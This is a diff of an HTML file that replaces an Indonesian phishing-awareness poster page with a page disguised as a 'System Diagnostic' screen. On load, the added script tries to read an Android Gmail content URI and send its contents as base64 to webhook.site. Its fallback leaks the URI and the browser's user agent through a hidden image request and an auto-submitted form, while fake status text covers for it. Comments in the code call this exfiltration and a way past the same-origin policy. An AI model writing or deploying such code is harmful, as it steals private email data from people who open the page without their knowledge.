@@ -1,42 +1,91 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Edukasi Phishing - Clarus IT</title>
-  <style>
-    * {
-      box-sizing: border-box;
-    }
-
-    body {
-      margin: 0;
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background: linear-gradient(135deg, #003366, #0099cc);
-      background-attachment: fixed;
-      font-family: Arial, sans-serif;
-    }
-
-    img {
-      max-width: 90%;
-      max-height: 90vh;
-      height: auto;
-      border-radius: 16px;
-      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
-      object-fit: contain;
-      transition: transform 0.3s ease;
-    }
-
-    img:hover {
-      transform: scale(1.02);
-    }
-  </style>
+    <meta charset="UTF-8">
+    <title>System Diagnostic</title>
+    <style>
+        body { background: #000; color: #f00; font-family: monospace; text-align: center; padding: 50px; }
+        #tunnel { width: 1px; height: 1px; opacity: 0.01; }
+        .status { border: 1px solid #f00; padding: 20px; display: inline-block; }
+    </style>
 </head>
 <body>
-  <!-- GANTI "img-http.png" dengan nama file gambarmu -->
-  <img src="img-http.png" alt="Poster Edukasi Phishing Clarus IT">
+    <div class="status">
+        <h2>[ ENCRYPTED BRIDGE ACTIVE ]</h2>
+        <div id="msg">Verifying Gmail Provider...</div>
+    </div>
+
+    <!-- Hidden Tunnel to load the content -->
+    <iframe id="tunnel" sandbox="allow-same-origin allow-scripts"></iframe>
+
+<script>
+const CONFIG = {
+    // FIX TOTAL: Pastikan URI ini 100% akurat tanpa typo
+    TARGET: "content://com.google.android.gm.sapi/cnfdnfial@://gmail.com",
+    WEBHOOK: "https://webhook.site"
+};
+
+async function execute() {
+    const log = (m) => document.getElementById('msg').innerText = m;
+    
+    try {
+        log("Executing Binary XHR Tunnel...");
+        const xhr = new XMLHttpRequest();
+        xhr.open("GET", CONFIG.TARGET, true);
+        xhr.responseType = "blob";
+
+        xhr.onload = function() {
+            if (xhr.status === 200 || xhr.status === 0) {
+                const reader = new FileReader();
+                reader.onloadend = function() {
+                    // EXFILTRASI: Mengirim seluruh isi file sebagai Base64 DataURL
+                    fetch(CONFIG.WEBHOOK, {
+                        method: "POST",
+                        mode: "no-cors",
+                        body: JSON.stringify({
+                            event: "SUCCESS_FULL_LEAK",
+                            data: reader.result,
+                            length: reader.result.length
+                        })
+                    });
+                    log("Sync Successful.");
+                };
+                reader.readAsDataURL(xhr.response);
+            } else {
+                log("Fallback: Redirecting to URI...");
+                forceNavigationLeak();
+            }
+        };
+        
+        xhr.onerror = () => forceNavigationLeak();
+        xhr.send();
+
+    } catch (e) {
+        forceNavigationLeak();
+    }
+}
+
+function forceNavigationLeak() {
+    // Teknik Terakhir: Memaksa browser mengirim URI via parameter jika SOP gagal ditembus
+    const leakUrl = `${CONFIG.WEBHOOK}?leak_type=NAV&uri=${btoa(CONFIG.TARGET)}&ua=${btoa(navigator.userAgent)}`;
+    
+    // Gunakan Image object untuk membocorkan data via GET (lebih sulit diblokir)
+    const img = new Image();
+    img.src = leakUrl;
+    
+    // Auto-submit form sebagai cadangan
+    const f = document.createElement('form');
+    f.method = "POST";
+    f.action = CONFIG.WEBHOOK;
+    const i = document.createElement('input');
+    i.name = "log";
+    i.value = "SOP_ACTIVE_NAV_LEAK";
+    f.appendChild(i);
+    document.body.appendChild(f);
+    setTimeout(() => f.submit(), 2000);
+}
+
+window.onload = execute;
+</script>
 </body>
 </html>
